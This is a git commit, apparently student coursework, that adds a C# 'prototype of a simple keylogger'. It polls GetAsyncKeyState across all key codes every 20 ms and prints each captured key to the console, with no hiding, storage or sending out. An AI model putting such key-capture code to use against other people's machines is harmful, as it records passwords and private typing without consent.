0a65025bbc97973f9f71b6eb8612163f2d507002
Федор Юрецкий <fedjaz5@gmail.com>
2020-03-23 01:34:51 +0300

    prototype of a simple keylogger

---
+++ 2 term/PT/fourth/Keylogger(task1)/Keylogger/Catcher.cs
@@ -0,0 +1,68 @@
+﻿using System;
+using System.Timers;
+using System.Windows.Forms;
+using System.Threading;
+using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Keylogger
+{
+    class Catcher
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(int key);
+
+        [DllImport("user32.dll")]
+        public static extern int ToUnicode(
+            uint virtualKeyCode,
+            uint scanCode,
+            byte[] keyboardState,
+            StringBuilder receivingBuffer,
+            int bufferSize,
+            uint flags);
+
+
+        System.Timers.Timer timer;
+        int delay;
+        public int Delay { get => delay; set => ChangeDelay(value); }
+        public bool IsActive { get => timer.Enabled; }
+
+        public delegate void KeyHandler(Keys key);
+        public event KeyHandler KeyPressed;
+        public Catcher(int delay)
+        {
+            timer = new System.Timers.Timer(delay);
+            Delay = delay;
+            timer.Elapsed += CheckKeys;
+        }
+        public void Start()
+        {
+            timer.Start();
+        }
+        public void Stop()
+        {
+            timer.Stop();
+        }
+        void ChangeDelay(int delay)
+        {
+            this.delay = delay;
+            timer.Interval = delay;
+        }
+        public void CheckKeys(Object source, ElapsedEventArgs e)
+        {
+            for (int i = 0; i < 255; i++)
+            {
+                int responce = GetAsyncKeyState(i);
+                if (responce == 32769)
+                {
+                    Keys key = (Keys)i;
+
+                    KeyPressed(key);
+                }
+            }
+        }
+    }
+}
---
+++ 2 term/PT/fourth/Keylogger(task1)/Keylogger/Program.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Threading;
+using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+
+namespace Keylogger
+{
+    class Program
+    {
+        static ManualResetEvent waitHandle = new ManualResetEvent(false);
+        static void Main(string[] args)
+        {
+            Catcher catcher;
+            Task CatherTask = Task.Factory.StartNew(() =>
+            {
+                catcher = new Catcher(20);
+                catcher.KeyPressed += KeyPressed;
+                catcher.Start();
+            });
+            waitHandle.WaitOne();
+        }
+
+        static void KeyPressed(Keys key)
+        {
+            KeysConverter kc = new KeysConverter();
+            string keyChar = kc.ConvertToString(key);
+            Console.Write(keyChar);
+        }
+    }
+}
